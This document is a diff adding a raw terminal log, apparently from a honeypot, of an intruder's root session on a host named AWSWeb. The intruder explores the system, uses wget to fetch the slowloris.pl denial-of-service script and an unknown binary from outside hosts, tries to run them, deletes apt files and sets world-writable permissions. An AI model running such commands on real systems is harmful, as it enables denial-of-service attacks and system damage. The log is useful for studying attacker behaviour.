@@ -1,0 +1,381 @@
+[4hAWSWeb:~# IamSo1337![1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pls
+[4l[4hAWSWeb:~# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hAWSWeb:~# cd /
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# perl
+bash: perl: command not found
+AWSWeb:/# mount
+[4l/dev/sda1 on / type ext3 (rw,errors=remount-ro)
+tmpfs on /lib/init/rw type tmpfs (rw,nosuid,mode=0755)
+proc on /proc type proc (rw,noexec,nosuid,nodev)
+sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
+udev on /dev type tmpfs (rw,mode=0755)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=620)
+[4hAWSWeb:/# cd /
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# df
+bash: df: command not found
+AWSWeb:/# echo
+[4l
+[4hAWSWeb:/# echo $SHELL
+[4l$SHELL
+[4hAWSWeb:/# [Kecho $SHELL[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptop
+bash: top: command not found
+AWSWeb:/# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hAWSWeb:/# ps --ef
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps --ef
+[4hAWSWeb:/# [Kps --ef[1D[1D[1D[1D[1P
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps -ef
+[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# l[1D[1Pwget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:/# uname
+[4lLinux
+[4hAWSWeb:/# [Kuname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:/# slo[1D[1P[1D[1P[1D[1Pphp
+bash: php: command not found
+AWSWeb:/# perl
+bash: perl: command not found
+AWSWeb:/# [Kperl[4D[Kphp[3D[Kuname -a[8D[Kuname[5D[Kwget[4D[Kls[2D[Kps -ef[6D[Kps --ef[7D[Kps[2D[Ktop[3D[Kecho $SHELL[11D[Kecho[4D[Kdf[2D[Kls[2D[Kcd /[4D[Kmount[5D[Kperl[4D[Kls[2D[Kcd /[4D[Kps[2D[Kls[1D[1P[1D[1Pls[1D[1P[1D[1Pcd
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# ls -la
+[4ldrwxr-xr-x 1 root root 4096 2013-12-17 16:33 .
+drwxr-xr-x 1 root root 4096 2013-12-17 16:33 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# [Kapt-get[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psu
+[4l[4hAWSWeb:~# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# [Kapt-get install
+[4l0 upgraded, 0 newly installed, 0 to remove and 258 not upgraded.
+[4hAWSWeb:~# [Kapt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 636.2kB of archives.
+After this operation, 1399.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.6-6 [636.2kB]
+Fetched 636.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.6-6_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.6-6) ...
+[4hAWSWeb:~# perl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# wget http://ha.ckers.org/slowloris/slowloris.pl
+[4l--2013-12-17 16:34:23--  http://ha.ckers.org/slowloris/slowloris.pl
+Connecting to ha.ckers.org:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18883 (18K) [text/plain; charset=ISO-8859-1]
+Saving to: `slowloris.pl
+
+ 6% [==>                                    ] 1,158        6K/s  eta 2s100%[======================================>] 18,883       6K/s
+
+2013-12-17 16:34:23 (6 KB/s) - `slowloris.pl' saved [18883/18883]
+[4hAWSWeb:~# ls
+[4lslowloris.pl 
+[4hAWSWeb:~# ./[1D[1P[1D[1Pchmod +x slo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod +x slowloris.pl 
+[4l[4hAWSWeb:~# ./slo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./slowloris.pl 
+bash: ./slowloris.pl: command not found
+AWSWeb:~# [K./slowloris.pl [15D[K[Kperl s[1D[1Pslo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pperl slowloris.pl 
+[4lperl: Segmentation fault
+[4hAWSWeb:~# wget htttp:[1D[1P[1D[1P[1D[1Pp://www.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pwww.lemarinel.net/perl
+[4l--2013-12-17 16:34:56--  http://www.lemarinel.net/perl
+Connecting to www.lemarinel.net:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10456 (10K) [text/whatever]
+Saving to: `perl
+
+11% [====>                                  ] 1,214        2K/s  eta 3s100%[======================================>] 10,456       2K/s
+
+2013-12-17 16:34:56 (2 KB/s) - `perl' saved [10456/10456]
+[4hAWSWeb:~# ls
+[4lslowloris.pl perl         
+[4hAWSWeb:~# ./[1D[1P[1D[1Pchmod +x perl
+[4l[4hAWSWeb:~# ./perl
+bash: ./perl: command not found
+AWSWeb:~# ls
+[4lslowloris.pl perl         
+[4hAWSWeb:~# rm ./perl
+[4l[4hAWSWeb:~# ls
+[4lslowloris.pl 
+[4hAWSWeb:~# uptime
+[4l 16:35:10 up 54 days, 21:56,  1 users, load averages: 0.09 0.05 0.05
+[4hAWSWeb:~# cd /dev/[1D[1P[1D[1P[1D[1P[1D[1Pproc
+[4l[4hAWSWeb:/proc# ls
+[4lasound        mpt           ide           scsi          crypto        
+key-users     swaps         kallsyms      dma           timer_stats   
+timer_list    iomem         ioports       sched_debug   misc          
+acpi          fb            mtrr          irq           cgroups       
+sys           bus           tty           driver        fs            
+sysvipc       net           sysrq-trigger kpageflags    kpagecount    
+kcore         modules       diskstats     zoneinfo      vmstat        
+pagetypeinfo  buddyinfo     vmallocinfo   slabinfo      interrupts    
+stat          partitions    cpuinfo       devices       locks         
+kmsg          mounts        execdomains   cmdline       filesystems   
+version       meminfo       uptime        loadavg       self          
+1             2             3             4             5             
+6             7             39            41            42            
+170           207           208           209           210           
+740           741           929           1015          1087          
+1554          1958          1967          1989          2006          
+2008          2010          2012          2014          2015          
+2030          2032          2041          
+[4hAWSWeb:/proc# cat info
+[4lcat: info: No such file or directory
+[4hAWSWeb:/proc# cd /var
+[4l[4hAWSWeb:/var# ls
+[4lbackups run     mail    cache   log     opt     tmp     local   lib     lock    
+spool   
+[4hAWSWeb:/var# d [1D[1P[1D[1Pcd log
+[4l[4hAWSWeb:/var/log# ls
+[4lkern.log.1   btmp         syslog       syslog.1     mail.info    lastlog      
+mail.err     news         dmesg        kern.log     daemon.log.1 fsck         
+messages     apt          auth.log     wtmp         messages.1   daemon.log   
+lpr.log      faillog      dmesg.1.gz   dpkg.log     debug        boot         
+dmesg.0      debug.1      user.log     mail.warn    mail.log     auth.log.1   
+[4hAWSWeb:/var/log# ls -ltr
+[4ldrwxr-xr-x 1 root root   4096 2013-12-17 16:35 .
+drwxr-xr-x 1 root root   4096 2013-12-17 16:35 ..
+-rw-r----- 1 root 4  51996 2009-11-08 11:25 kern.log.1
+-rw-rw-r-- 1 root 43      0 2009-11-06 11:09 btmp
+-rw-r----- 1 root 4  67178 2009-11-20 08:20 syslog
+-rw-r----- 1 root 4  60005 2009-11-08 11:25 syslog.1
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.info
+-rw-rw-r-- 1 root 43 292292 2009-11-20 09:07 lastlog
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.err
+drwxr-xr-x 1 root root   4096 2009-11-06 12:44 news
+-rw-r----- 1 root 4  34350 2009-11-20 08:19 dmesg
+-rw-r----- 1 root 4  52524 2009-11-20 08:20 kern.log
+-rw-r----- 1 root 4   2579 2009-11-08 11:25 daemon.log.1
+drwxr-xr-x 1 root root   4096 2009-11-06 11:09 fsck
+-rw-r----- 1 root 4  37897 2009-11-20 08:20 messages
+drwxr-xr-x 1 root root   4096 2009-11-06 11:10 apt
+-rw-r----- 1 root 4  10942 2009-11-20 09:07 auth.log
+-rw-rw-r-- 1 root 43  29952 2009-11-20 09:07 wtmp
+-rw-r----- 1 root 4  37303 2009-11-08 11:25 messages.1
+-rw-r----- 1 root 4  13410 2009-11-20 08:19 daemon.log
+-rw-r----- 1 root 4      0 2009-11-06 12:44 lpr.log
+-rw-r--r-- 1 root root  24024 2009-11-08 15:47 faillog
+-rw-r----- 1 root 4     59 2009-11-20 08:19 dmesg.1.gz
+-rw-r----- 1 root 4 177814 2009-11-08 15:47 dpkg.log
+-rw-r----- 1 root 4  14703 2009-11-20 08:20 debug
+-rw-r----- 1 root 4     31 2009-11-06 11:09 boot
+-rw-r----- 1 root 4  34350 2009-11-20 08:19 dmesg.0
+-rw-r----- 1 root 4  14552 2009-11-08 11:25 debug.1
+-rw-r----- 1 root 4     70 2009-11-20 08:19 user.log
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.warn
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.log
+-rw-r----- 1 root 4   8978 2009-11-08 11:25 auth.log.1
+[4hAWSWeb:/var/log# tail a[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+apt        auth.log   auth.log.1 
+AWSWeb:/var/log# tail au[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Ptail auth.log
+bash: tail: command not found
+AWSWeb:/var/log# [Ktail auth.log[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat autj[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat auth.log
+[4lcat: /var/log/auth.log: No such file or directory
+[4hAWSWeb:/var/log# [Kcat auth.log.1
+[4lcat: /var/log/auth.log.1: No such file or directory
+[4hAWSWeb:/var/log# dir
+bash: dir: command not found
+AWSWeb:/var/log# ls
+[4lkern.log.1   btmp         syslog       syslog.1     mail.info    lastlog      
+mail.err     news         dmesg        kern.log     daemon.log.1 fsck         
+messages     apt          auth.log     wtmp         messages.1   daemon.log   
+lpr.log      faillog      dmesg.1.gz   dpkg.log     debug        boot         
+dmesg.0      debug.1      user.log     mail.warn    mail.log     auth.log.1   
+[4hAWSWeb:/var/log# ls -l
+[4ldrwxr-xr-x 1 root root   4096 2013-12-17 16:35 .
+drwxr-xr-x 1 root root   4096 2013-12-17 16:35 ..
+-rw-r----- 1 root 4  51996 2009-11-08 11:25 kern.log.1
+-rw-rw-r-- 1 root 43      0 2009-11-06 11:09 btmp
+-rw-r----- 1 root 4  67178 2009-11-20 08:20 syslog
+-rw-r----- 1 root 4  60005 2009-11-08 11:25 syslog.1
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.info
+-rw-rw-r-- 1 root 43 292292 2009-11-20 09:07 lastlog
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.err
+drwxr-xr-x 1 root root   4096 2009-11-06 12:44 news
+-rw-r----- 1 root 4  34350 2009-11-20 08:19 dmesg
+-rw-r----- 1 root 4  52524 2009-11-20 08:20 kern.log
+-rw-r----- 1 root 4   2579 2009-11-08 11:25 daemon.log.1
+drwxr-xr-x 1 root root   4096 2009-11-06 11:09 fsck
+-rw-r----- 1 root 4  37897 2009-11-20 08:20 messages
+drwxr-xr-x 1 root root   4096 2009-11-06 11:10 apt
+-rw-r----- 1 root 4  10942 2009-11-20 09:07 auth.log
+-rw-rw-r-- 1 root 43  29952 2009-11-20 09:07 wtmp
+-rw-r----- 1 root 4  37303 2009-11-08 11:25 messages.1
+-rw-r----- 1 root 4  13410 2009-11-20 08:19 daemon.log
+-rw-r----- 1 root 4      0 2009-11-06 12:44 lpr.log
+-rw-r--r-- 1 root root  24024 2009-11-08 15:47 faillog
+-rw-r----- 1 root 4     59 2009-11-20 08:19 dmesg.1.gz
+-rw-r----- 1 root 4 177814 2009-11-08 15:47 dpkg.log
+-rw-r----- 1 root 4  14703 2009-11-20 08:20 debug
+-rw-r----- 1 root 4     31 2009-11-06 11:09 boot
+-rw-r----- 1 root 4  34350 2009-11-20 08:19 dmesg.0
+-rw-r----- 1 root 4  14552 2009-11-08 11:25 debug.1
+-rw-r----- 1 root 4     70 2009-11-20 08:19 user.log
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.warn
+-rw-r----- 1 root 4      0 2009-11-06 12:44 mail.log
+-rw-r----- 1 root 4   8978 2009-11-08 11:25 auth.log.1
+[4hAWSWeb:/var/log# cat boot
+[4lcat: /var/log/boot: No such file or directory
+[4hAWSWeb:/var/log# cat[1D[1P[1D[1P[1D[1Papt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/var/log# [Kapt-get update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /var/lib
+[4l[4hAWSWeb:/var/lib# cd apt
+[4l[4hAWSWeb:/var/lib/apt# ls
+[4lperiodic        cdroms.list     extended_states cdroms.list~    lists           
+[4hAWSWeb:/var/lib/apt# chmod +[1D[1P-R 77 *[1D[1D7
+[4l[4hAWSWeb:/var/lib/apt# [Kchmod -R 777 *[14D[Kls[2D[Kcd apt[6D[Kcd /var/lib[11D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/var/lib/apt# su
+[4l[4hAWSWeb:/var/lib/apt# [Ksu[2D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/var/lib/apt# rm /var/lib/apt/lists/lock
+[4l[4hAWSWeb:/var/lib/apt# [Krm /var/lib/apt/lists/lock[26D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/var/lib/apt# cd lis[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd lists/
+[4l[4hAWSWeb:/var/lib/apt/lists# ls
+[4l
+security.debian.org_dists_lenny_updates_Release.gpg                                ftp.us.debian.org_debian_dists_lenny_main_binary-i386_Packages                     volatile.debian.org_debian-volatile_dists_lenny_volatile_Release                   ftp.us.debian.org_debian_dists_lenny_main_source_Sources                           ftp.us.debian.org_debian_dists_lenny_Release.gpg                                   ftp.us.debian.org_debian_dists_lenny_Release                                       volatile.debian.org_debian-volatile_dists_lenny_volatile_main_binary-i386_Packages security.debian.org_dists_lenny_updates_Release                                    volatile.debian.org_debian-volatile_dists_lenny_volatile_Release.gpg               partial                                                                            security.debian.org_dists_lenny_updates_main_source_Sources                        security.debian.org_dists_lenny_updates_main_binary-i386_Packages                  volatile.debian.org_debian-volatile_dists_lenny_volatile_main_source_Sources       
+[4hAWSWeb:/var/lib/apt/lists# ls l[1D[1P
+[4l
+security.debian.org_dists_lenny_updates_Release.gpg                                ftp.us.debian.org_debian_dists_lenny_main_binary-i386_Packages                     volatile.debian.org_debian-volatile_dists_lenny_volatile_Release                   ftp.us.debian.org_debian_dists_lenny_main_source_Sources                           ftp.us.debian.org_debian_dists_lenny_Release.gpg                                   ftp.us.debian.org_debian_dists_lenny_Release                                       volatile.debian.org_debian-volatile_dists_lenny_volatile_main_binary-i386_Packages security.debian.org_dists_lenny_updates_Release                                    volatile.debian.org_debian-volatile_dists_lenny_volatile_Release.gpg               partial                                                                            security.debian.org_dists_lenny_updates_main_source_Sources                        security.debian.org_dists_lenny_updates_main_binary-i386_Packages                  volatile.debian.org_debian-volatile_dists_lenny_volatile_main_source_Sources       
+[4hAWSWeb:/var/lib/apt/lists# rm *
+[4lrm: cannot remove `partial': Is a directory
+[4hAWSWeb:/var/lib/apt/lists# ls
+[4lpartial 
+[4hAWSWeb:/var/lib/apt/lists# [Kls[2D[Krm *[4D[Kls [3D[Kls[2D[Kcd lists/[9D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/var/lib/apt/lists# cd ..
+[4l[4hAWSWeb:/var/lib/apt# ls -ltrh
+[4ldrwxr-xr-x 1 root root 4096 2013-12-17 16:37 .
+drwxr-xr-x 1 root root 4096 2013-12-17 16:37 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 periodic
+-rw-r--r-- 1 root root  249 2009-11-06 11:12 cdroms.list
+-rw-r--r-- 1 root root 1435 2009-11-08 15:47 extended_states
+-rw-r--r-- 1 root root  249 2009-11-06 11:12 cdroms.list~
+drwxr-xr-x 1 root root 4096 2009-11-08 15:44 lists
+[4hAWSWeb:/var/lib/apt# chmod 777 lis[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod 777 lists/
+[4l[4hAWSWeb:/var/lib/apt# ls
+[4lperiodic        cdroms.list     extended_states cdroms.list~    lists           
+[4hAWSWeb:/var/lib/apt# ls -l
+[4ldrwxr-xr-x 1 root root 4096 2013-12-17 16:37 .
+drwxr-xr-x 1 root root 4096 2013-12-17 16:37 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:09 periodic
+-rw-r--r-- 1 root root  249 2009-11-06 11:12 cdroms.list
+-rw-r--r-- 1 root root 1435 2009-11-08 15:47 extended_states
+-rw-r--r-- 1 root root  249 2009-11-06 11:12 cdroms.list~
+drwxr-xr-x 1 root root 4096 2009-11-08 15:44 lists
+[4hAWSWeb:/var/lib/apt# icfongi[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pfconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:/var/lib/apt# 
+AWSWeb:/var/lib/apt# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# ps
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps 
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# 
